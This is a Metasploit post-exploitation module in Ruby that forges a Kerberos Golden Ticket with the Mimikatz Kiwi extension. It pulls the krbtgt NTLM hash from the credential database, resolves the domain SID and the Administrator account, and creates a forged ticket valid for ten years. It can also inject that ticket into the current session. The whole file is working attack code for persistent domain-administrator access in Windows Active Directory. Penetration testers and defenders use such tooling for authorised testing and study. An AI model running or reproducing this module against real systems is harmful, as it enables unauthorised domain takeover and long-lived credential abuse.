##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/netapi'
require 'msf/core/post/windows/kiwi'
require 'msf/core/post/windows/error'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::NetAPI
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Kiwi
  include Msf::Post::Windows::Error

  def initialize(info = {})
    super(update_info(
      info,
      'Name'         => 'Windows Escalate Golden Ticket',
      'Description'  => %q{
          This module will create a Golden Kerberos Ticket using the Mimikatz Kiwi Extension. If no
        options are applied it will attempt to identify the current domain, the domain administrator
        account, the target domain SID, and retrieve the krbtgt NTLM hash from the database. By default
        the well-known Administrator's groups 512, 513, 518, 519, and 520 will be applied to the ticket.
        },
      'License'      => MSF_LICENSE,
      'Author'       => [
        'Ben Campbell'
      ],
      'Platform'     => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ],
      'References'   =>
            [
              ['URL', 'https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos']
            ]
    ))

    register_options(
      [
        OptBool.new('USE', [true, 'Use the ticket in the current session', false]),
        OptString.new('USER', [false, 'Target User']),
        OptString.new('DOMAIN', [false, 'Target Domain']),
        OptString.new('KRBTGT_HASH', [false, 'KRBTGT NTLM Hash']),
        OptString.new('Domain SID', [false, 'Domain SID']),
        OptInt.new('ID', [false, 'Target User ID']),
        OptString.new('GROUPS', [false, 'ID of Groups (Comma Separated)']),
        OptInt.new('END_IN', [true, 'End in ... Duration in hours, default 10 YEARS (~87608 hours)', 87608])
      ])
  end

  def run
    return unless load_kiwi

    user = datastore['USER']
    domain = datastore['DOMAIN']
    krbtgt_hash = datastore['KRBTGT_HASH']
    domain_sid = datastore['SID']
    id = datastore['ID'] || 0
    end_in = datastore['END_IN'] || 87608

    unless domain
      print_status('Searching for the domain...')
      domain = get_domain
      if domain
        print_good("Targeting #{domain}")
      else
        fail_with(Failure::Unknown, 'Unable to retrieve the domain...')
      end
    end

    unless krbtgt_hash
      if framework.db.active
        print_status('Searching for krbtgt hash in database...')
        krbtgt_hash = lookup_krbtgt_hash(domain)
        fail_with(Failure::Unknown, 'Unable to find krbtgt hash in database') unless krbtgt_hash
      else
        fail_with(Failure::BadConfig, 'No database, please supply the krbtgt hash')
      end
    end

    unless domain_sid
      print_status("Obtaining #{domain} SID...")
      domain_sid = lookup_domain_sid(domain)

      if domain_sid
        print_good("Found #{domain} SID: #{domain_sid}")
      else
        fail_with(Failure::Unknown, "Unable to find SID for #{domain}")
      end
    end

    unless user
      if id && id != 0
        print_status("Looking up User ID: #{id}")
        user = resolve_sid("#{domain_sid}-#{id}")[:name]
      else
        print_status('Looking up Domain Administrator account...')
        user = resolve_sid("#{domain_sid}-500")[:name]
      end

      if user
        print_good("Found User: #{user}")
      else
        fail_with(Failure::Unknown, 'Unable to find User')
      end
    end

    print_status("Creating Golden Ticket for #{domain}\\#{user}...")
    ticket = client.kiwi.golden_ticket_create({
      user:        user,
      domain_name: domain,
      domain_sid:  domain_sid,
      krbtgt_hash: krbtgt_hash,
      id:          id,
      group_ids:   datastore['GROUPS'],
      end_in:     end_in
    })

    if ticket
      print_good('Golden Ticket Obtained!')
      ticket_location = store_loot("golden.ticket",
                                   "base64/kirbi",
                                   session,
                                   ticket,
                                   "#{domain}\\#{user}-golden_ticket.kirbi",
                                   "#{domain}\\#{user} Golden Ticket")

      print_status("Ticket saved to #{ticket_location}")

      if datastore['USE']
        print_status("Attempting to use the ticket...")
        client.kiwi.kerberos_ticket_use(ticket)
        print_good("Kerberos ticket applied successfully")
      end
    else
      fail_with(Failure::Unknown, 'Unable to create ticket')
    end
  end

  def lookup_domain_sid(domain)
    string_sid = nil

    cb_sid = sid_buffer = 100
    cch_referenced_domain_name = referenced_domain_name_buffer = 100

    res = client.railgun.advapi32.LookupAccountNameA(
                               nil,
                               domain,
                               sid_buffer,
                               cb_sid,
                               referenced_domain_name_buffer,
                               cch_referenced_domain_name,
                               1)

    if !res['return'] && res['GetLastError'] == INSUFFICIENT_BUFFER
      sid_buffer = cb_sid = res['cbSid']
      referenced_domain_name_buffer = cch_referenced_domain_name = res['cchReferencedDomainName']

      res = client.railgun.advapi32.LookupAccountNameA(
          nil,
          domain,
          sid_buffer,
          cb_sid,
          referenced_domain_name_buffer,
          cch_referenced_domain_name,
          1)
    elsif !res['return']
      return nil
    end

    if res['return']
      sub_authority_count = res['Sid'].unpack('CC')[1]
      sid = res['Sid'].unpack("CCCCCCCCV#{sub_authority_count}")

      string_sid = "S-#{sid[0]}-#{sid[7]}-#{sid[8]}-#{sid[9]}-#{sid[10]}-#{sid[11]}"
    else
      print_error("Error looking up SID: #{res['ErrorMessage']}")
    end

    string_sid
  end

  def lookup_krbtgt_hash(domain)
    krbtgt_hash = nil

    krbtgt_creds = Metasploit::Credential::Core.joins(:public, :private).where(
        metasploit_credential_publics: { username: 'krbtgt' },
        metasploit_credential_privates: { type: 'Metasploit::Credential::NTLMHash' },
        workspace_id: myworkspace.id)

    if krbtgt_creds

      if krbtgt_creds.count == 0
        print_error('No KRBTGT Hashes found in database')
      elsif krbtgt_creds.count > 1

        # Can we reduce the list by domain...
        krbtgt_creds_realm = krbtgt_creds.select { |c| c.realm.to_s.upcase == domain.upcase }

        # We have found a krbtgt hashes in our target domain
        if krbtgt_creds_realm.length == 1
          cred = krbtgt_creds_realm.first
          krbtgt_hash = cred.private.data.split(':')[1]
          print_good("Using #{cred.realm}:#{cred.public.username}:#{krbtgt_hash}")
          return krbtgt_hash
        # We have found multiple krbtgt hashes in our target domain?!
        elsif krbtgt_creds_realm.length > 0
          krbtgt_creds = krbtgt_creds_realm
        end

        # Multiple hashes found, the user will have to manually set one...
        print_error('Multiple KRBTGT Hashes found in database, please use one of the below:')
        krbtgt_creds.each do |kc|
          hash = kc.private.data.split(':')[1]
          print_line("#{kc.realm}:#{kc.public.username}:#{hash}")
        end
      else
        # Highlander, there can only be one!
        cred = krbtgt_creds.first
        krbtgt_hash = cred.private.data.split(':')[1]
        print_good("Using #{cred.realm}:#{cred.public.username}:#{krbtgt_hash}")
      end
    end

    krbtgt_hash
  end
end
